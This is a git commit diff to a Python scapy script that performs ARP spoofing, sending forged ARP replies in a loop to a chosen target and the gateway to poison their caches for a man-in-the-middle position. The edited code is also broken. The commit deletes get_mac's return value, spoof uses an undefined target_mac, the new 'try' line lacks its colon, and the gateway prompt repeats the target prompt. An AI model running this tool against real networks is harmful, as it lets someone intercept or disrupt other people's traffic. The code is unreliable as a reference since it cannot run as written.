c458f42de17d58985f1ed5a30238a127b070615b
Prabhdeep Singh Taneja <53391937+prabhdeep1@users.noreply.github.com>
2020-07-01 13:58:49 +0530

    Update arp-spoof.py

--- arp-spoof.py
+++ arp-spoof.py
@@ -9,13 +9,6 @@ def get_mac(ip):
     arp_request_broadcast = broadcast/arp_request
     answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
 
-    print(answered_list[0][1].hwsrc)
-    clients_list = []
-    for element in answered_list:
-        client_dict = {"ip": element[1].psrc, "mac": element[1].hwsrc}
-        clients_list.append(client_dict)
-    return clients_list
-
 def spoof(target_ip, spoof_ip):
     packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
     scapy.send(packet, verbose=False)
@@ -23,13 +16,13 @@ def spoof(target_ip, spoof_ip):
 target_ip = input("enter target ip : ")
 gateway_ip = input("enter target ip: ")
 
-try:
-    sent_packets_count = 0
+sent_packets_count = 0
+try
     while True:
         spoof(target_ip, gateway_ip)
         spoof(gateway_ip, target_ip)
         sent_packets_count = sent_packets_count + 2
-        print("\r[+] Packets Sent: " + str(sent_packets_count), end= "")
+        print("\r[+] Packets Sent: " + str(sent_packets_count), end="")
         time.sleep(2)
 except KeyboardInterrupt:
     print("[+] Quitting")
